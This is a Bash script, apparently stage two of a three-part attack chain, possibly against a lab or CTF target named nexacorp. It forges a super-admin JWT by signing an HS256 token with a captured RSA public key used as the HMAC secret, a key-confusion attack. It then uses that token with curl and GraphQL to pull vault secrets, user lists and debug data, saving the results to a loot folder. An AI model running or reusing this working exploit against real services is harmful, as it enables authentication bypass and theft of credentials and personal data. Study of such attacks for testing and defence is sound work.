#!/usr/bin/env bash
# Stage 2/3 — Forge JWT con role=super-admin usando pem_bytes como HMAC secret
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

PEM="${LOOT_DIR}/pubkey.pem"
KID="nexacorp-prod-key-1"

[[ -f "${PEM}" ]] || { echo "[!] Falta ${PEM} — corre primero 12_jwt_targeted.sh"; exit 1; }

echo "[*] Forjando JWT super-admin..."
TOKEN=$(python3 - <<PYEOF
import hmac, hashlib, json, base64, time
with open("${PEM}","rb") as f: secret = f.read()
header = {"alg":"HS256","typ":"JWT","kid":"${KID}"}
now = int(time.time())
payload = {
    "sub":"super-admin",
    "email":"super-admin@nexacorp.local",
    "role":"super-admin",
    "permissions":["*","admin","super-admin","vault:read","vault:write","vault:critical"],
    "iat": now,
    "exp": now + 3600
}
b = lambda x: base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()
h = b(header); p = b(payload)
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
PYEOF
)

echo "[+] TOKEN super-admin:"
echo "    ${TOKEN}"
echo "${TOKEN}" > "${LOOT_DIR}/super_admin_token.jwt"
echo

echo "##########################################"
echo "# /api/vault/critical-secrets"
echo "##########################################"
curl -s "${API_URL}/api/vault/critical-secrets" -H "Authorization: Bearer ${TOKEN}" -w '\n[code=%{http_code}]\n' | tee "${LOOT_DIR}/vault_response.txt"
echo

echo "##########################################"
echo "# /api/v2/users/me"
echo "##########################################"
curl -s "${API_URL}/api/v2/users/me" -H "Authorization: Bearer ${TOKEN}" -w '\n[code=%{http_code}]\n'
echo

echo "##########################################"
echo "# /api/v2/users (lista completa)"
echo "##########################################"
curl -s "${API_URL}/api/v2/users" -H "Authorization: Bearer ${TOKEN}" -w '\n[code=%{http_code}]\n'
echo

echo "##########################################"
echo "# /api/v2/reports/generate (probable SSRF)"
echo "##########################################"
curl -s "${API_URL}/api/v2/reports/generate" -H "Authorization: Bearer ${TOKEN}" -w '\n[code=%{http_code}]\n'
echo

echo "##########################################"
echo "# GraphQL con super-admin token"
echo "##########################################"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"query":"{ me { id email role permissions } users { id email role permissions } internalLogs vaultSecrets { id key value classification accessLevel } debugInfo { flag } }"}' \
  | tee "${LOOT_DIR}/gql_admin_dump.json" | jq

echo
echo "[+] Loot:"
ls -la "${LOOT_DIR}/"
